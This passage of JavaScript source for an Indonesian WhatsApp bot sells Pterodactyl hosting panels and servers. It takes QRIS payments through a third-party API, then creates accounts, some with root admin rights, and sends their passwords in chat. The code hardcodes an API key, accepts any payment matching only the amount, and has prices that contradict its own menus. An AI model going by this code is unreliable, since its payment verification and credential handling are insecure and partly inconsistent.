          delete db.users[m.sender].saweria;
        }
      }, 300000);
    }
  };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
    await sleep(8000);
    const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
    const req = await resultcek.data;
    if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;
      await clearInterval(db.users[m.sender].saweria.exp);
      await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, { quoted: db.users[m.sender].saweria.msg });

      let username = Obj.username;
      let email = username + "@gmail.com";
      let name = capital(username);
      let password = crypto.randomBytes(4).toString('hex');
      let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
          "email": email,
          "username": username.toLowerCase(),
          "first_name": name,
          "last_name": "Admin",
          "root_admin": true,
          "language": "en",
          "password": password.toString()
        })
      });

      let data = await f.json();
      if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
      let user = data.attributes;
      var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}
* *Expired :* 1 Bulan

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`;
      await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
      await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
      delete db.users[m.sender].saweria;
    }
  }
}
break;

case 'batalbeli': {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await cupen.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await cupen.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
await m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

case 'buypanel':
{
 let audioFile = './audio.mp3';
await cupen.sendMessage(m.chat, { react: { text: '♨️', key: m.key } })
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*_Pᴀɴᴇʟ Pᴜʙʟɪᴄ_*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [{
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `*_Sɪʟᴀʜᴋᴀɴ Pɪʟɪʜ Rᴀᴍ Pᴀɴᴇʟ Dɪ Bᴀᴡᴀʜ_*
`,
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/rvrqwv.jpg' }}, { upload: cupen.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
"name": "single_select",
"buttonParamsJson": `{ "title": "Rᴀᴍ Pᴀɴᴇʟ", "sections": [{ "title": "# ꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ", "highlight_label": \"Pᴏᴡᴇʀᴇᴅ Bʏ ❀SalwaCantik❀\", "rows": [{ "header": "1Gʙ", "title": "くそ  1.000", "id": ".buy1gb" }, 
{ "header": "2Gʙ", "title": "くそ 2Gʙ 2.000", "id": ".buy2gb" }, 
{ "header": "3Gʙ", "title": "くそ 3Gʙ 3.000", "id": ".buy3gb" }, 
{ "header": "4Gʙ", "title": "くそ 4Gʙ 4.000", "id": ".buy4gb" }, 
{ "header": "5Gʙ", "title": "くそ 5Gʙ 5.000", "id": ".buy5gb" }, 
{ "header": "Uɴʟɪ", "title": "くそ Uɴʟɪ 6.000", "id": ".buyunli" }]}]}`
}, 

 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Chanell Developer\",\"url\":\"https://whatsapp.com/channel/0029VajU7yJJZg47Mgw99L0W\",\"merchant_url\":\"https://t.me/botobf\"}`
 }]
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: qtoko })
 await cupen.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
 await cupen.sendMessage(m.chat, {
 audio: { url: audioFile },
 mimetype: 'audio/mpeg'
 }, { quoted: fkontak })
 }
 break
case 'buypanelprivate':
{
 let audioFile = './audio.mp3';
await cupen.sendMessage(m.chat, { react: { text: '♨️', key: m.key } })
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*_Pᴀɴᴇʟ Pʀɪᴠᴀᴛᴇ_*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [{
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `*_Sɪʟᴀʜᴋᴀɴ Pɪʟɪʜ Rᴀᴍ Pᴀɴᴇʟ Dɪ Bᴀᴡᴀʜ_*
`,
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/rvrqwv.jpg' }}, { upload: cupen.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
"name": "single_select",
"buttonParamsJson": `{ "title": "Rᴀᴍ Pᴀɴᴇʟ", "sections": [{ "title": "# ꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ", "highlight_label": \"Pᴏᴡᴇʀᴇᴅ Bʏ ❀SalwaCantik❀\", "rows": [{ "header": "1Gʙ", "title": "くそ 2.000", "id": ".buy1gb2" }, 
{ "header": "2Gʙ", "title": "くそ 4.000", "id": ".buy2gb2" }, 
{ "header": "3Gʙ", "title": "くそ 6.000", "id": ".buy3gb2" }, 
{ "header": "4Gʙ", "title": "くそ 8.000", "id": ".buy4gb2" }, 
{ "header": "5Gʙ", "title": "くそ 10.000", "id": ".buy5gb2" }, 
{ "header": "Uɴʟɪ", "title": "くそ 12.000", "id": ".buyunli2" }]}]}`
}, 

 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Chanell Developer\",\"url\":\"https://whatsapp.com/channel/0029VajU7yJJZg47Mgw99L0W\",\"merchant_url\":\"https://t.me/botobf\"}`
 }]
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: qtoko })
 await cupen.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
 await cupen.sendMessage(m.chat, {
 audio: { url: audioFile },
 mimetype: 'audio/mpeg'
 }, { quoted: fkontak })
 }
 break
 
case 'buyunli2': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 1; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* Unlimited Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Unlimited Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain2 + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain2 + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 0,
              swap: 0,
              disk: 0,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain2}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy1gb2': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 1000;
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 1Gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 1gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain2 + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "❀SalwaCantik❀",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain2 + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 1024,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain2}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy2gb2': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 2Gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 2Gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain2 + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain2 + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            name: username,
            description: "2Gb Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 2024,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain2}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy3gb2': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 3000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 3gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 3Gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain2 + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain2 + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            name: username,
            description: "3Gb Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 3240,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain2}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy4gb2': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
